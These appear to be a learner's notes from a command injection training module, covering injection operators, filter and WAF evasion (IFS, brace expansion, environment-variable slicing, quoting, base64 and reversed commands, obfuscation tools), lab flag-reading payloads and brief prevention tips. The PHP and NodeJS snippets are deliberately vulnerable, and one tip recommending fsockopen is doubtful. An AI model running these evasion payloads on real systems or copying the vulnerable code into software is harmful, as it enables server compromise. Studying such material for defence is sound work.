* one of the most critical types of vulnerabilities
* allows an attacker to execute system commands directly on the back-end hosting server
* like other Injection Vulnerabilities: occurs when user input is unsafely concatenated to the original query

**OS Command Injections:**
* PHP example:
```php
<?php if (isset($_GET['filename'])) { system("touch /tmp/" . $_GET['filename'] . ".pdf"); } ?>
```
* NodeJS
```javascript
app.get("/createfile", function(req, res){ child_process.exec(`touch /tmp/${req.query.filename}.txt`); })
```

# Exploitation
## Detection

| Injection Operator | Injection Character | URL-Encoded | Executed Command                                             |
| ------------------ | ------------------- | ----------- | ------------------------------------------------------------ |
| Semicolon          | ;                   | %3b         | Both                                                         |
| New Line           | \n                  | %0a         | Both                                                         |
| Background         | &                   | %26         | Both (second output generally shown first)                   |
| Pipe               | \|                  | %7c         | Both (second one is shown, first one is given to second one) |
| AND                | &&                  | %26%26      | Both (only if first succeeds)                                |
| OR                 | \|\|                | %7c%7c      | Second (only if first fails)                                 |
| Sub-Shell          | \`\`                | %60%60      | Both (Linux-only)                                            |
| Sub-Shell          | $()                 | %24%28%29   | Both (Linux-only)                                            |

## Injecting Commands
For example, close first command with semicolon and start new one:
```bash
ping -c 1 127.0.0.1; whoami
```
Bypassing Front-end Validation:
* Burp POST Request
* ZAP Repeater
* curl

## Other Injection Operators
AND Operator: 
The first command needs to be successful 
```bash
ping -c 1 127.0.0.1 && whoami
```

OR Operator:
Second one is only executed if first one fails!
```bash
ping -c 1 127.0.0.1 || whoami # first one succeeds, second one wont execute
ping -c 1 || whoami # first one fails, second one will execute
```


# Filter Evasion
## Identifying Filters
**Filter/WAF Detection:**
* if error message displays a different page, with information like our IP and request, this may indicate the usage of a WAF
**Blacklisted Characters:**
* a web app may have a list of black listed characters, if command contains them it would deny the request
* before evasion, we need to test which characters are actually denied 
* basically, limit the tested characters to one per request and just see which is accepted

## Bypassing Space Filters
**Bypass Blacklisted Operators:**
Usually, new-line character is not blacklisted (while most others are)

**Bypass Blacklisted Spaces:**
Spaces are often blacklisted as well, so we need to do some evasion.
* Using Tabs:
	* %09
	* Sometimes using tabs might work as evasion technique
* Using $IFS
	* Linux Environment Variable
	* its default is a space and a tab
	* example: 127.0.0.1%0a${IFS}
* Using Brace Expansion
	* Bash Brace Expansion feature automatically adds spaces between arguments wrapped between braces
```shellsession
lunims@htb[/htb]$ {ls,-la} 
total 0 
drwxr-xr-x 1 21y4d 21y4d 0 Jul 13 07:37 . 
drwxr-xr-x 1 21y4d 21y4d 0 Jul 13 13:01 ..
```
* also: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
**Task Query:**
```bash
curl http://154.57.164.68:32032 -X POST --data "ip=127.0.0.1%0a{ls,-la}" --show-headers
```

## Bypassing Other Blacklisted Characters
* Besides injection operators and spaces, slashes (forward and backslah) are commonly blacklisted characters

**Linux**
* many techniques to have slashes in out payload
* Linux Environment Variables:
```shellsession
lunims@htb[/htb]$ echo ${PATH} 
/usr/local/bin:/usr/bin:/bin:/usr/games
```
```shellsession
lunims@htb[/htb]$ echo ${PATH:0:1} 
/
```
* same can be applied to $HOME and $PWD
* For semicolons using $LS_COLORS:
```shellsession
lunims@htb[/htb]$ echo ${LS_COLORS:10:1} 
;
```
**Windows**
* Spaces with %HOMEPATH% 
```cmd-session
C:\htb> echo %HOMEPATH:~6,-11% 
\
```
* Power-shell:
```powershell-session
PS C:\htb> $env:HOMEPATH[0] 
\ 
PS C:\htb> $env:PROGRAMFILES[10] 
PS C:\htb>
```
* Get-ChildItem Env: prints all env variables in Powershell

**Character Shifting**
* shift characters by their ascii value:
```shellsession
lunims@htb[/htb]$ man ascii # \ is on 92, before it is [ on 91 
lunims@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[) 
\
```

Task Payload: ip=127.0.0.1%0a{ls,${PATH:0:1}home}

## Bypassing Blacklisted Commands
* sometimes a set of different commands is blacklisted as well

**Linux & Windows:**
* easy approach: insert characters that are usually ignored within command shells like Bash or Powershell:
```shellsession
lunims@htb[/htb]$ w'h'o'am'i 
lunims
```
Works with double quotes as well
Keep in mind: We cannot mix quotes and the number quotes needs to be even

**Linux Only**
* use backslash character or positional character $@
```bash
who$@ami 
w\ho\am\i
```

**Windows Only**
* caret character ^
```cmd-session
C:\htb> who^ami 

lunims
```

Task Payload: 
```bash
ip=127.0.0.1%0a{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
```

## Advanced Command Obfuscation
**Case Manipulation**
* inverting (WHOAMI) or alternating (WhOaMi) between cases
* a command blacklist may not check for different case variations
```powershell-session
PS C:\htb> WhOaMi 
lunims
```
```shell-session
lunims@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi") 
lunims
```
Or: 
```bash
$(a="WhOaMi";printf %s "${a,,}")
```

**Reversed Commands**
* reverse commands and having command template that switches them back and executes them
```shellsession
lunims@htb[/htb]$ echo 'whoami' | rev 
imaohw
```
```shellsession
lunims@htb[/htb]$ $(rev<<<'imaohw') 
lunims
```

Windows:
```powershell-session
PS C:\htb> "whoami"[-1..-20] -join '' 
imaohw

PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

lunims
```

**Encoded Commands**
* encode it via base64 or hex and pipe it into decoding and bash
```bash
echo -n 'cat /etc/passwd | grep 33' | base64 
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
Note: Here <<< is used to avoid | filters
```powershell-session
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami')) dwBoAG8AYQBtAGkA
```
Keep in mind, if we encode in Linux for Windows machine, we need to change the encoding from utf-8 to utf-16:
```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64 
dwBoAG8AYQBtAGkA
```
```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" 
lunims
```
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion

Task Payload:
```bash
ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEK)
```
Note: this did not execute on my kali VM because zsh has different value for ${IFS} in default.
It works on the target system (bash)

## Evasion Tools
* Linux (bashfuscator)
```shellsession
lunims@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator lunims@htb[/htb]$ cd Bashfuscator lunims@htb[/htb]$ pip3 install setuptools==65 lunims@htb[/htb]$ python3 setup.py install --user
```
```shellsession
lunims@htb[/htb]$ cd ./bashfuscator/bin/ 
lunims@htb[/htb]$ ./bashfuscator -h
lunims@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'
```
```shellsession
lunims@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 
[+] Mutators used: Token/ForCode 
[+] Payload: eval "$(W0=(w \ t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)" 
[+] Payload size: 104 characters
```
* Windows (DOSfuscation)
```powershell-session
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git PS C:\htb> cd Invoke-DOSfuscation 
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1 
PS C:\htb> Invoke-DOSfuscation 
Invoke-DOSfuscation> help
```
```powershell-session
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt Invoke-DOSfuscation> encoding Invoke-DOSfuscation\Encoding> 1 
...SNIP... 
Result: typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```
Note: if we have no windows vm we can run above code using pwsh.

# Prevention

### System Commands
* system commands should always be avoided, especially when using user input with them
* instead: use built-in system command execution functions (PHP: fsockopen)
### Input Validation and Sanitization
* user input should always be validated and then sanitized
* input validation should be done at both front- and back-end
* PHP: filer_var function can be useful
* preg_replace for input sanitization (PHP)
* DOMPurify for JS (NodeJS)

# Skill Assessment
Working payload:
tmp%26%26{c'at',${PATH:0:1}flag.txt}

https://154.57.164.68:30957/index.php?to=tmp%26%26{c%27at%27,${PATH:0:1}flag.txt}&from=2561732172.txt&finish=1&move=1